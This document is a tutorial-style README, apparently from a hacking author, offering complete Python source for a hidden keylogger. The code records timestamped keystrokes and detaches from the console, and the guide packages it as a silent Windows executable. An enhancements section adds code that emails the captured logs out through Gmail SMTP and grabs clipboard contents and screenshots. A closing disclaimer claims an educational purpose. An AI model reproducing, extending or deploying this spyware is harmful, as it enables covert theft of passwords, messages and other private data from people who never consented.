
# **Keylogger with Timestamp & Hidden Execution**
### **Author:** D4rkN0d3  
### **Description:**  
This keylogger captures keystrokes, logs them with timestamps, and runs as a hidden background process. The logs are saved in a text file (`keylog.txt`).  

---

## **1️⃣ Features**
✅ Logs all keystrokes (letters, numbers, special keys)  
✅ Adds timestamps to each keystroke  
✅ Runs in the background (hidden process)  
✅ Creates a log file (`keylog.txt`)  
✅ Works silently without a visible console  

---

## **2️⃣ Installation**
### **Install Dependencies**  
Ensure Python is installed (`python --version`). Then, install required modules:  
```sh
pip install pynput
```
To run it as an executable, install `pyinstaller`:  
```sh
pip install pyinstaller
```

---

## **3️⃣ How It Works**
- **Listens** for keyboard events using `pynput.keyboard`.  
- **Records keystrokes** and stores them in `keylog.txt`.  
- **Adds timestamps** using Python's `logging` module.  
- **Hides execution** (on Windows) using `ctypes.windll.kernel32.FreeConsole()`.  

---

## **4️⃣ Keylogger Code**
```python
import logging
import os
import sys
import time
from pynput import keyboard

# Set up logging
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            logging.info(f"{key.char}")
        else:
            logging.info(f" [{key}] ")  # Special keys like Shift, Enter, etc.
    except Exception as e:
        logging.error(f"Error: {e}")

# Hide console window (Windows only)
def hide_console():
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.kernel32.FreeConsole()

# Start keylogger
hide_console()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

---

## **5️⃣ Running the Keylogger**
### **Run the Python Script (Testing)**
```sh
python keylogger.py
```
- The script starts logging keystrokes.
- Press **Ctrl + C** in the terminal to stop.

### **Convert to a Hidden Executable**
To make it run in the background, convert it into an EXE:  
```sh
pyinstaller --onefile --noconsole keylogger.py
```
🔹 `--onefile`: Packages everything into a single EXE.  
🔹 `--noconsole`: Hides the terminal window.

After running this, the `dist/keylogger.exe` file is created.

---

## **6️⃣ How to Stop the Keylogger**
### **1. Stop via Task Manager (Windows)**
- Open **Task Manager** (`Ctrl + Shift + Esc`).
- Go to the **Details** tab.
- Find `keylogger.exe`, right-click, and **End Task**.

### **2. Stop via Command Line**
#### **PowerShell**
```powershell
Stop-Process -Name "keylogger" -Force
```
#### **Command Prompt**
```sh
taskkill /F /IM keylogger.exe
```

### **3. Delete the Executable (Permanent Removal)**
1. Stop the process (`taskkill` or **Task Manager**).
2. Delete the `keylogger.exe` file.
3. Check **Startup Programs** (if you added it there).

---

## **7️⃣ Enhancements**
### **📌 1. Send Logs via Email**
Automatically send logs via email every X minutes.
```python
import smtplib
from email.message import EmailMessage

def send_email():
    msg = EmailMessage()
    msg['Subject'] = "Keylog Report"
    msg['From'] = "your_email@gmail.com"
    msg['To'] = "your_email@gmail.com"
    
    with open("keylog.txt", "r") as file:
        msg.set_content(file.read())

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login("your_email@gmail.com", "your_password")
        server.send_message(msg)

send_email()
```
🚨 **Note:** Enable "Less Secure Apps" in Gmail or use an **app password**.

### **📌 2. Capture Clipboard Data**
Use `pyperclip` to log copied text:
```python
import pyperclip
clipboard_data = pyperclip.paste()
logging.info(f"Clipboard: {clipboard_data}")
```
Install `pyperclip`:  
```sh
pip install pyperclip
```

### **📌 3. Take Screenshots at Intervals**
Use `Pillow` to capture screenshots:
```python
from PIL import ImageGrab

def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")

capture_screenshot()
```
Install `Pillow`:  
```sh
pip install pillow
```

---

## **8️⃣ Legal Disclaimer**
🔴 **This keylogger is for educational and ethical hacking purposes ONLY.**  
🔴 Using this on someone else's computer **without consent** is illegal.  
🔴 **Always get permission before deploying security tools.**  

---

## **9️⃣ Conclusion**
This keylogger demonstrates how to capture keystrokes, hide execution, and log timestamps. Further improvements can include **network transmission, clipboard logging, and screenshot capturing.**  

